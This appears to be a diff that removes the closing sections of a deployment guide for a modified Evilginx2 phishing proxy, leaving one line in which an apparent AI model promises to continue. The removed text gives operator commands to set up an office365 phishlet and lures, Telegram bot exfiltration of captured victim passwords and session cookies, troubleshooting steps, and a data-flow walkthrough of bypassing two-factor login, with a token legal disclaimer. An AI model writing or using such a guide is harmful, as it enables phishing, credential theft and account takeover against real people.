-# Without Dashboard (CLI only)
-./evilginx2
-```
-
-## Basic Config (inside `:` console)
-```
-config domain yourdomain.com
-config ipv4 external YOUR_SERVER_IP
-config autocert on
-config unauth_url https://www.google.com
-blacklist unauth
-```
-
-## Telegram Config (inside `:` console)
-```
-config teletoken YOUR_BOT_TOKEN
-config chatid YOUR_CHAT_ID
-test telegram
-```
-
-## Phishlet Commands (inside `:` console)
-```
-phishlets hostname office365 yourdomain.com
-phishlets enable office365
-lures create office365
-lures edit 0 redirect-url https://www.google.com
-lures get-url 0
-sessions
-sessions <id>
-```
-
-## Service Management
-```bash
-sudo systemctl enable --now evilginx
-sudo systemctl status evilginx
-sudo journalctl -u evilginx -f
-```
-
-## Telegram API Testing
-```bash
-# Test token
-curl -s "https://api.telegram.org/botTOKEN/getMe"
-
-# Get chat ID (message the bot first)
-curl -s "https://api.telegram.org/botTOKEN/getUpdates"
-
-# Send test message
-curl -s "https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=Hello%20from%20Evilginx"
-```
-
----
-
-# 🔧 Troubleshooting
-
-## Autocert Fails — "port 80 not available"
-
-```
-sudo lsof -i :80
-```
-
-Port 80 is used by Let's Encrypt for domain validation. Make sure no other service (Apache, Nginx, Caddy) is using it.
-
-## "certificate error" in Browser
-
-1. Verify DNS records point to your server IP with **grey cloud** (DNS Only)
-2. Wait for DNS propagation (10–15 minutes)
-3. Check autocert is enabled: `config autocert on`
-4. Check domain is set: `config domain yourdomain.com`
-
-## Telegram Not Sending Notifications
-
-```bash
-# 1. Test the bot token directly
-curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"
-
-# 2. Test sending a message
-curl -s "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHATID&text=test"
-
-# 3. Verify config inside Evilginx
-: config
-```
-
-## Dashboard Not Loading
-
-```bash
-sudo ufw status | grep 5000
-```
-
-If not listed: `sudo ufw allow 5000/tcp`
-
-## "address already in use"
-
-```bash
-pkill -f evilginx2
-sleep 2
-ss -tlnp | grep -E '(:53|:443|:5000)'
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
-```
-
-## DNS Not Resolving
-
-```bash
-# Check DNS propagation
-dig @1.1.1.1 yourdomain.com +short
-
-# Should return your server IP
-```
-
-## Build Fails — Go Version
-
-```bash
-go version
-# Must be go1.22.5
-```
-
-## Phishlet Shows "Not Found"
-
-```bash
-: phishlets
-```
-
-Make sure `phishlets hostname` was run **before** `phishlets enable`.
-
-## Systemd Service Fails to Start
-
-```bash
-sudo journalctl -u evilginx -n 50 --no-pager
-```
-
-Check for permission errors, missing paths, or port conflicts.
-
----
-
-# 🧩 Inside the Code — Architecture Overview
-
-## How the Components Fit Together
-
-```
-main.go
-  │
-  ├──► Starts Nameserver (DNS)
-  ├──► Starts CertDB (SSL certificates)
-  ├──► Starts HttpProxy (MITM proxy engine)
-  ├──► Starts Telegram Queue (async notification processor)
-  │       │
-  │       └──► core/telegram_queue.go
-  │               │
-  │               └──► core/notify.go (createTxtFile, sendTelegramNotification, editMessageFile)
-  │
-  ├──► Starts Dashboard Server (web UI)
-  │       │
-  │       └──► core/dashboard.go (HTML template + REST API)
-  │
-  ├──► Starts Terminal (CLI interface)
-  │
-  └──► On exit: stops dashboard and telegram queue
-```
-
-## Key Data Flow: Capture to Notification
-
-```
-1. Victim submits credentials on phishing page
-         │
-         ▼
-2. HttpProxy.OnRequest() captures POST body
-   ──► Extracts username/password from form or JSON
-   ──► Stores in Session object (core/session.go)
-         │
-         ▼
-3. HttpProxy.OnResponse() intercepts response
-   ──► Captures Set-Cookie headers (session tokens)
-   ──► Captures body tokens / HTTP header tokens
-   ──► Checks if all auth tokens are captured
-         │
-         ▼
-4. If all tokens captured:
-   ──► Saves to database (database/db_session.go)
-   ──► Calls sendTelegramNotificationForSession()
-         │
-         ▼
-5. Enqueues TelegramJob (core/telegram_queue.go)
-   ──► Async goroutine processes the queue
-         │
-         ▼
-6. core/notify.go:
-   ──► Creates .txt file with cookies/tokens
-   ──► Sends formatted message + file attachment
-   ──► Stores message_id for future edits
-         │
-         ▼
-7. If more tokens arrive later:
-   ──► Edits the same Telegram message (no duplicate)
-   ──► Sends updated .txt attachment
-```
-
-## Key Files and Their Roles
-
-| File | Role |
-|---|---|
-| `main.go` | Application entry point. Parses flags (`-dashboard`, `-dashboard-user`, `-dashboard-pass`), initializes all components, starts/shuts down gracefully |
-| `core/http_proxy.go` | The MITM proxy engine. Handles request interception, cookie capture, URL rewriting, credential extraction, and session management |
-| `core/session.go` | In-memory session representation. Tracks username, password, tokens, redirect URL, and completion state |
-| `core/notify.go` | Telegram notification engine. Formats messages, creates token `.txt` files, sends via Telegram API, edits existing messages |
-| `core/telegram_queue.go` | Async notification queue. Uses a buffered channel to process Telegram notifications without blocking the proxy |
-| `core/tsession.go` | Telegram session struct (`TSession`) used for JSON serialization when communicating with Telegram API |
-| `core/dashboard.go` | Web dashboard server. Serves HTML template, provides REST API for sessions, supports search/filter/export/delete |
-| `core/config.go` | Configuration manager. Includes `SetChatid()`, `SetTeletoken()`, and `ValidateTelegramConfig()` methods |
-| `database/database.go` | BuntDB database wrapper. Provides `CreateSession`, `ListSessions`, `DeleteSession`, etc. |
-| `database/db_session.go` | Session struct definition (`Id`, `Phishlet`, `Username`, `Password`, `SessionId`, `CookieTokens`, etc.) and CRUD operations |
-| `Dockerfile` | Multi-stage Docker build (golang:1.22-alpine → alpine:latest, ~18MB final image) |
-
-## Database Session Schema
-
-```go
-type Session struct {
-    Id           int                                // Auto-incremented ID
-    Phishlet     string                             // e.g., "office365"
-    LandingURL   string                             // The lure URL the victim visited
-    Username     string                             // Captured username/email
-    Password     string                             // Captured password
-    Custom       map[string]string                  // Custom fields from phishlet
-    BodyTokens   map[string]string                  // Tokens extracted from HTTP response body
-    HttpTokens   map[string]string                  // Tokens extracted from HTTP headers
-    CookieTokens map[string]map[string]*CookieToken // Session cookies (the 2FA bypass)
-    SessionId    string                             // Unique session identifier (UUID)
-    UserAgent    string                             // Victim's browser user-agent
-    RemoteAddr   string                             // Victim's IP address
-    CreateTime   int64                              // Unix timestamp of creation
-    UpdateTime   int64                              // Unix timestamp of last update
-    Cmsgid       string                             // Telegram message ID for credential notification
-    Tmsgid       string                             // Telegram message ID for token notification
-}
-```
-
-## Telegram Notification Flow
-
-```
-                    ┌─────────────────────────┐
-                    │  Session Captured       │
-                    │  (credentials + tokens) │
-                    └───────────┬─────────────┘
-                                │
-                                ▼
-                    ┌─────────────────────────┐
-                    │  Enqueue TelegramJob    │
-                    │  (async, non-blocking)  │
-                    └───────────┬─────────────┘
-                                │
-                                ▼
-                    ┌─────────────────────────┐
-                    │  Create .txt file with  │
-                    │  formatted token JSON   │
-                    └───────────┬─────────────┘
-                                │
-                                ▼
-                    ┌─────────────────────────────┐
-                    │  Is this session already    │
-                    │  processed?                 │
-                    │  (check processedSessions)  │
-                    └───────┬─────────────┬───────┘
-                            │             │
-                          NO │             │ YES
-                            ▼             ▼
-              ┌──────────────────┐  ┌──────────────────┐
-              │ Send new message │  │ Edit existing    │
-              │ via Telegram API │  │ message via      │
-              │ Store message_id │  │ editMessageFile()│
-              └──────────────────┘  └──────────────────┘
-```
-
----
-
-# 👏 Credits & Support
-
-## Contributors
-
-| Contribution | Author |
-|---|---|
-| **Telegram Notifications** (async queue, file attachments, auto-updating messages) | [@officialmonsterz](https://t.me/officialmonsterz) |
-| **Web Dashboard** (HTML UI, REST API, CSV/JSON export, search, dark mode) | [@officialmonsterz](https://t.me/officialmonsterz) |
-| **Database Layer** (BuntDB integration, session CRUD) | [@officialmonsterz](https://t.me/officialmonsterz) |
-| **Docker Build** (multi-stage, Alpine, ~18MB) | [@officialmonsterz](https://t.me/officialmonsterz) |
-| **Original Evilginx2/3** | Kuba Gretzky ([@mrgretzky](https://github.com/kgretzky)) — [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |
-
-## Get Help
-
-- **Telegram Support:** [t.me/officialmonsterz](https://t.me/officialmonsterz)
-- **Email:** `shapads@tutamail.com`
-- **GitHub Issues:** [github.com/officialmonsterz/evilginx2/issues](https://github.com/officialmonsterz/evilginx2/issues)
-- **Documentation:** See other `.md` files in the repository
-
-## Evilginx Training Course
-
-> 🔥 _Already mastering Evilginx? Level up with the complete [Evilginx Training Course](https://t.me/officialmonsterz/)._
-
----
-
-## ⚠️ Legal Disclaimer
-
-This tool is for **authorized security testing only**. You must have **explicit written permission** before testing any system you do not own. Unauthorized use is illegal and unethical.
-
-This deployment guide is provided for **educational purposes** and **legitimate security assessments** conducted by authorized professionals.
-
----
-
-*Created with ❤️ by [@officialmonsterz](https://t.me/officialmonsterz) — Special thanks to the entire Evilginx community for their contributions and support.*
+Let me post this much now and continue with Phases 10-12 + cheat sheet + troubleshooting + architecture in the next response.
